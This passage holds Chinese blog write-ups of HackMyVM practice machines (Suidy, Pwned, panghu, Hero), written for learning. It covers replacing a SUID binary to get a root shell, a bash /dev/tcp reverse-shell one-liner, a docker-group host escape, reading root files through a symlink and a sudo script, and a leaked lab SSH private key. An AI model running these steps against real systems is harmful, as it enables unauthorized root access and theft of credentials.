class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.**comment**</span><br></pre></td></tr></table></figure></div>
<p>这里面有&#x2F;bin&#x2F;bash,猜测执行之后就是给一个终端，下载本地，用ida看看具体逻辑</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setuid</span>(<span class="number">0x3E9u</span>);</span><br><span class="line">  <span class="built_in">setgid</span>(<span class="number">0x3E9u</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里设置了一个suid然后执行&#x2F;bin&#x2F;bash，如果能改这个setsuid就可以了，改成0就是root的shell了<br>所以尝试创建一个文件。用相同的逻辑，替换掉这个文件，执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">179.83</span>/tmp.c</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-09 <span class="number">05</span><span class="symbol">:</span><span class="number">03</span><span class="symbol">:</span><span class="number">33</span>--  <span class="symbol">http:</span>/<span class="regexp">/192.168.179.83/tmp</span>.c</span><br><span class="line"><span class="title class_">Connecting</span> to <span class="number">192.168</span>.<span class="number">179.83</span><span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">122</span> [text/x-csrc]</span><br><span class="line"><span class="title class_">Saving</span> <span class="symbol">to:</span> <span class="string">&#x27;tmp.c&#x27;</span></span><br><span class="line"></span><br><span class="line">tmp.c                        <span class="number">100</span><span class="string">%[=============================================&gt;]</span>     <span class="number">122</span>  --.-<span class="variable constant_">KB</span>/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-09 <span class="number">05</span><span class="symbol">:</span><span class="number">03</span><span class="symbol">:</span><span class="number">33</span> (<span class="number">1.31</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;tmp.c&#x27;</span> saved [<span class="number">122</span>/<span class="number">122</span>]</span><br><span class="line"></span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>chmod +x tmp.c</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cat tmp.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main()&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>gcc tmp.c -o a</span><br></pre></td></tr></table></figure></div>
<p>但是直接mv提示进程在占用，因为之前运行过了suidyyyyy这个文件，然后在了suidy这个用户的bash中<br>所以设置一下两个文件的权限<br>退出到theuser然后再替换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>chmod <span class="number">777</span> a</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>cp a /tmp</span><br><span class="line">suidy<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>mv a suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cp suidyyyyy /home/suidy/suidyyyyy</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cd /home/suidy</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy </span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">warning:</span> <span class="symbol">setlocale:</span> <span class="symbol">LC_ALL:</span> cannot change locale (en_US.<span class="title class_">UTF</span><span class="number">-8</span>)</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls</span><br><span class="line">a  a.c  note.txt  pspy64  suidyyyyy  tmp.c</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>ls -al</span><br><span class="line">total <span class="number">3108</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> suidy suidy      <span class="number">4096</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">04</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root  root       <span class="number">4096</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> suidy suidy        <span class="number">12</span> <span class="title class_">Sep</span> <span class="number">27</span>  <span class="number">2020</span> .bash_history</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy suidy       <span class="number">220</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy suidy      <span class="number">3526</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .bashrc</span><br><span class="line">drwxr-xr-x <span class="number">3</span> suidy suidy      <span class="number">4096</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .local</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy suidy       <span class="number">807</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> .profile</span><br><span class="line">-rwxrwxrwx <span class="number">1</span> suidy theuser   <span class="number">16712</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">04</span> a</span><br><span class="line">-rw-r--r-- <span class="number">1</span> suidy theuser       <span class="number">0</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">00</span> a.c</span><br><span class="line">-r--r----- <span class="number">1</span> suidy suidy       <span class="number">197</span> <span class="title class_">Sep</span> <span class="number">26</span>  <span class="number">2020</span> note.txt</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> suidy theuser <span class="number">3104768</span> <span class="title class_">Feb</span>  <span class="number">5</span> <span class="number">11</span><span class="symbol">:</span><span class="number">11</span> pspy64</span><br><span class="line">-rwsrwsr-x <span class="number">1</span> root  theuser   <span class="number">16712</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">14</span> suidyyyyy</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> suidy theuser     <span class="number">122</span> <span class="title class_">Feb</span>  <span class="number">9</span> <span class="number">05</span><span class="symbol">:</span><span class="number">03</span> tmp.c</span><br><span class="line">theuser<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="variable">$ </span>./suidyyyyy</span><br><span class="line">root<span class="variable">@suidy</span><span class="symbol">:/home/suidy</span><span class="comment"># cd /root   </span></span><br><span class="line">root<span class="variable">@suidy</span><span class="symbol">:/root</span><span class="comment"># ls</span></span><br><span class="line">root.txt  timer.sh</span><br><span class="line">root<span class="variable">@suidy</span><span class="symbol">:/root</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>结束</p>
<p>总结：有点意思的只有提权这边，对有suid的程序进行分析，然后修改suid的值替换原文件</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Pwned</title>
    <url>/posts/3123.html</url>
    <content><![CDATA[<p>HMV-Pwned靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png"></p>
<h1 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h1><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><img src="https://pic1.imgdb.cn/item/679a3c54d0e0a243d4f879d6.png" alt="|275"><br>开放了三个端口 ftp ssh  http  </p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>访问80端口 网页中只有一句话和一个注释<br><img src="https://pic1.imgdb.cn/item/679a3c55d0e0a243d4f879d7.png"><br><img src="https://pic1.imgdb.cn/item/679a3c58d0e0a243d4f879d8.png" alt="|450"><br>说明员工里面有一个女性<br>然后用dirsearch跑一遍   发现之后一个nothing目录  nothing里面确实是nothing😂<br>这里没有可以注入的点  也没有找到可以进入的目录   没有任何的方向了 说明一定是信息收集不够<br>用gobuster再跑一遍   <code>gobuster dir -u 192.168.240.74 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60</code><br>发现了新的目录  &#x2F;hidden_text<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879d9.png"><br>找到一个文件  里面又是一些目录的字典 现在再用dirsearch跑一遍     然后进入那个可以访问的界面<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879da.png" alt="|375"><br><img src="https://pic1.imgdb.cn/item/679a3c89d0e0a243d4f879e3.png"><br>进入后有一个登录界面  但是没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a3c8ad0e0a243d4f879e4.png" alt="|500"><br>发现有一个注释  注释里面有有用户名ftpuser 密码 B0ss_B!TcH  所以可以登录ftp 还能登录ssh</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3c8cd0e0a243d4f879e5.png" alt="|375"><br>进入这个shell之后发现里面有两个文件  一个是rsa的私钥  然后告诉了我们一个用户ariana<br>现在就用这个私钥进入这个用户  在登录之前要先chmod 600<br>拿到ariana的shell<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e6.png"><br>找到了另外一个用户selena<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e7.png"><br>sudo -l 发现可以执行一个脚本<br><img src="https://pic1.imgdb.cn/item/679a3cb8d0e0a243d4f879ee.png"><br>脚本中的内容为：<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879ef.png" alt="|650"><br>这个脚本会echo $msg 就是你写入的消息会被打出来  所以我们可以用selena身份执行脚本  然后得到bash<br>这里nc 没有-e指令 学习一种新的反弹shell方式<br><code>bash -i &gt;&amp;/dev/tcp/ 攻击机_IP / 攻击机端口 0&gt;&amp;1</code>  <a href="https://blog.csdn.net/qq_64177395/article/details/143491556">反弹shell</a><br>这里我们直接发bash得到selena 的 shell<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879f0.png"><br>发现id在docker组 要用docker提权<br><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p>
<h2 id="docker提权命令详细解释"><a href="#docker提权命令详细解释" class="headerlink" title="docker提权命令详细解释"></a>docker提权命令详细解释</h2><h4 id="1-docker-run"><a href="#1-docker-run" class="headerlink" title="1. docker run"></a>1. <code>docker run</code></h4><p>这是 Docker 命令，用于启动一个新的容器并运行指定的命令。</p>
<h4 id="2-v-mnt"><a href="#2-v-mnt" class="headerlink" title="2. -v /:/mnt"></a>2. <code>-v /:/mnt</code></h4><ul>
<li><code>-v</code> 是 Docker 的卷挂载选项，用于将宿主机的文件系统挂载到容器中。</li>
<li><code>/</code> 表示宿主机的根文件系统。</li>
<li><code>/mnt</code> 是容器内部的挂载点。</li>
</ul>
<p>所以，<code>-v /:/mnt</code> 这部分命令的作用是将宿主机的根文件系统 <code>/</code> 挂载到容器内部的 <code>/mnt</code> 目录。</p>
<h4 id="3-rm"><a href="#3-rm" class="headerlink" title="3. --rm"></a>3. <code>--rm</code></h4><ul>
<li><code>--rm</code> 表示在容器停止后自动删除容器。这使得容器在退出后不会在 Docker 主机上留下残余文件。</li>
</ul>
<h4 id="4-it"><a href="#4-it" class="headerlink" title="4. -it"></a>4. <code>-it</code></h4><ul>
<li><code>-i</code>：保持容器的标准输入打开（交互式模式）。</li>
<li><code>-t</code>：为容器分配一个伪终端，这样可以进行交互式操作。</li>
</ul>
<p>这两个选项组合起来意味着容器将以交互式模式运行，允许用户在容器内执行命令。</p>
<h4 id="5-alpine"><a href="#5-alpine" class="headerlink" title="5. alpine"></a>5. <code>alpine</code></h4><ul>
<li>这是一个小型的 Linux 发行版镜像，通常用于构建轻量级的 Docker 容器。它包含最基本的工具和库，非常适合用作基础镜像。</li>
</ul>
<h4 id="6-chroot-mnt"><a href="#6-chroot-mnt" class="headerlink" title="6. chroot /mnt"></a>6. <code>chroot /mnt</code></h4><ul>
<li><code>chroot</code> 是 Linux 中的一个命令，用于改变当前进程的根目录。执行 <code>chroot /mnt</code> 后，容器内的文件系统根目录变成了 <code>/mnt</code>，而 <code>mnt</code> 被挂载到了宿主机的根文件系统 <code>/</code>。</li>
<li>这意味着，容器内的程序和命令将认为 <code>/mnt</code> 是文件系统的根目录。由于 <code>/mnt</code> 映射了宿主机的根文件系统，这实际上使得容器内部的进程进入了宿主机的文件系统环境。</li>
</ul>
<h4 id="7-sh"><a href="#7-sh" class="headerlink" title="7. sh"></a>7. <code>sh</code></h4><ul>
<li><code>sh</code> 是在容器中执行的命令，它启动一个 shell（即 <code>sh</code>），允许你在容器内与宿主机的根文件系统交互。</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>panghu</title>
    <url>/posts/59637.html</url>
    <content><![CDATA[<p>panghu复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a1fe35d0e0a243d4fbcf9f.png"><br>这个是个简单的靶机，但是我有一个点没有想到，卡了很久，开了懦夫模式<br>登录入口是ssh&#x2F;panghu</p>
<h1 id="第一阶段（读到-root-root-txt"><a href="#第一阶段（读到-root-root-txt" class="headerlink" title="第一阶段（读到&#x2F;root&#x2F;root.txt)"></a>第一阶段（读到&#x2F;root&#x2F;root.txt)</h1><p>有一个sudo权限的脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">ssh:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ssh on <span class="symbol">jan:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">ssh:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ssh may run the following commands on <span class="symbol">jan:</span></span><br><span class="line">    (root) <span class="symbol">PASSWD:</span> /opt/lzh.sh</span><br><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>cat /opt/lzh.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cd /home/ssh</span><br><span class="line">cat backup/hi</span><br></pre></td></tr></table></figure></div>
<p>内容是查看&#x2F;home&#x2F;ssh&#x2F;backup&#x2F;hi<br>现在的目标是如何利用这个脚本能读到&#x2F;root&#x2F;root.txt呢<br>没有修改hi的权限，对hi没有任何的权限<br>但是对backup这个目录有x操作权限，无法删除就把backup重命名<br>然后新建一个backup 然后用软链接就可以读到了<br>（我一直在hi这个文件里面想，其实啥都没有）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sv /root/root.txt /home/ssh/backup/hi</span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>

<h1 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h1><p>通过第一阶段就可以知道，利用lzh.sh就可以读取任意文件内容<br>所以可以编写一个脚本，脚本内容来自群里的eviden</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span>[ -e <span class="string">&quot;backup&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">rm</span> -rf backup</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;removed&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">mkdir</span> -p backup</span><br><span class="line">source_file=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">ln</span> -sn <span class="string">&quot;<span class="variable">$&#123;$source_file&#125;</span>&quot;</span> <span class="string">&quot;/home/ssh/backup/hi&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> /opt/lzh.sh</span><br></pre></td></tr></table></figure></div>
<p>这样子就可以自动读取了<br>我们去读ssh的配置文件，思路是读取私钥然后登录root</p>
<p>找到ssh私钥的地址 但是不是id_rsa是id_ed25519，而且这个目录在root目录下面，不是ssh目录，就觉得为什么有私钥还登录不上root，hhhhh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>etc<span class="regexp">/ssh/</span>ssh_config</span><br><span class="line">removed</span><br><span class="line"><span class="string">&#x27;backup/hi&#x27;</span> -&gt; <span class="string">&#x27;/etc/ssh/ssh_config&#x27;</span></span><br><span class="line"><span class="comment">#	$OpenBSD: ssh_config,v 1.36 2023/08/02 23:04:38 djm Exp $</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the ssh client system-wide configuration file.  See</span></span><br><span class="line"><span class="comment"># ssh_config(5) for more information.  This file provides defaults for</span></span><br><span class="line"><span class="comment"># users, and the values can be changed in per-user configuration files</span></span><br><span class="line"><span class="comment"># or on the command line.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration data is parsed as follows:</span></span><br><span class="line"><span class="comment">#  1. command line options</span></span><br><span class="line"><span class="comment">#  2. user-specific file</span></span><br><span class="line"><span class="comment">#  3. system-wide file</span></span><br><span class="line"><span class="comment"># Any configuration value is only changed the first time it is set.</span></span><br><span class="line"><span class="comment"># Thus, host-specific definitions should be at the beginning of the</span></span><br><span class="line"><span class="comment"># configuration file, and defaults at the end.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site-wide defaults for some commonly used options.  For a comprehensive</span></span><br><span class="line"><span class="comment"># list of available options, their meanings and defaults, please see the</span></span><br><span class="line"><span class="comment"># ssh_config(5) man page.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Include configuration snippets before processing this file to allow the</span></span><br><span class="line"><span class="comment"># snippets to override directives set in this file.</span></span><br><span class="line"><span class="comment">#Include /etc/ssh/ssh_config.d/*.conf</span></span><br><span class="line"><span class="comment">#Banner /etc/shadow</span></span><br><span class="line"><span class="comment"># Host *</span></span><br><span class="line"><span class="comment">#   ForwardAgent no</span></span><br><span class="line"><span class="comment">#   ForwardX11 no</span></span><br><span class="line"><span class="comment">#   PasswordAuthentication yes</span></span><br><span class="line"><span class="comment">#   HostbasedAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIDelegateCredentials no</span></span><br><span class="line"><span class="comment">#   BatchMode no</span></span><br><span class="line"><span class="comment">#   CheckHostIP no</span></span><br><span class="line"><span class="comment">#   AddressFamily any</span></span><br><span class="line"><span class="comment">#   ConnectTimeout 0</span></span><br><span class="line"><span class="comment">#   StrictHostKeyChecking ask</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_dsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ecdsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ed25519</span></span><br><span class="line"><span class="comment">#   Port 22</span></span><br><span class="line"><span class="comment">#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span></span><br><span class="line"><span class="comment">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</span></span><br><span class="line"><span class="comment">#   EscapeChar ~</span></span><br><span class="line"><span class="comment">#   Tunnel no</span></span><br><span class="line"><span class="comment">#   TunnelDevice any:any</span></span><br><span class="line"><span class="comment">#   PermitLocalCommand no</span></span><br><span class="line"><span class="comment">#   VisualHostKey no</span></span><br><span class="line"><span class="comment">#   ProxyCommand ssh -q -W %h:%p gateway.example.com</span></span><br><span class="line"><span class="comment">#   RekeyLimit 1G 1h</span></span><br><span class="line"><span class="comment">#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>root<span class="regexp">/.ssh/i</span>d_ed25519</span><br></pre></td></tr></table></figure></div>
<p>vi id_rsa<br>chmod 600 id_rsa<br>ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x32;&#52;&#48;&#x2e;&#49;&#53;">root@192.168.240.15</a> -i id_rsa</p>
<pre><code>登录root了


</code></pre>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-hero</title>
    <url>/posts/20816.html</url>
    <content><![CDATA[<p>HMV-hero靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a62239d0e0a243d4fca307.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.180</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">15</span>:<span class="number">58</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.180</span> (<span class="number">192.168</span>.<span class="number">179.180</span>)</span><br><span class="line">Host is up (<span class="number">0.0071</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE         VERSION</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span>   open     domain          dnsmasq <span class="number">2.51</span></span><br><span class="line">| <span class="params">dns-nsid:</span> </span><br><span class="line">|_  bind.<span class="params">version:</span> dnsmasq-<span class="number">2.51</span></span><br><span class="line"><span class="number">8081</span><span class="symbol">/tcp</span> filtered blackice-icecap</span><br><span class="line">MAC <span class="params">Address:</span> AE:<span class="number">01</span>:<span class="number">4</span>B:<span class="number">69</span>:<span class="number">88</span>:D3 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> phone</span><br><span class="line"><span class="params">Running:</span> Google Android <span class="number">10</span>.X, Linux <span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:google:android:<span class="number">10</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Android <span class="number">9</span> <span class="operator">-</span> <span class="number">10</span> (Linux <span class="number">4.9</span> <span class="operator">-</span> <span class="number">4.14</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">7.15</span> ms <span class="number">192.168</span>.<span class="number">179.180</span> (<span class="number">192.168</span>.<span class="number">179.180</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">20.09</span> seconds</span><br></pre></td></tr></table></figure></div>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>访问80端口得到ssh私钥 然后生成公钥 得到用户名</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># curl 192.168.179.81</span></span><br><span class="line"><span class="params">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L</span><br><span class="line">UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg</span><br><span class="line">AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75</span><br><span class="line">BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=</span><br><span class="line"><span class="params">-----END</span> OPENSSH PRIVATE KEY<span class="params">-----</span></span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># ssh-keygen -y -f tmp</span></span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero</span><br></pre></td></tr></table></figure>
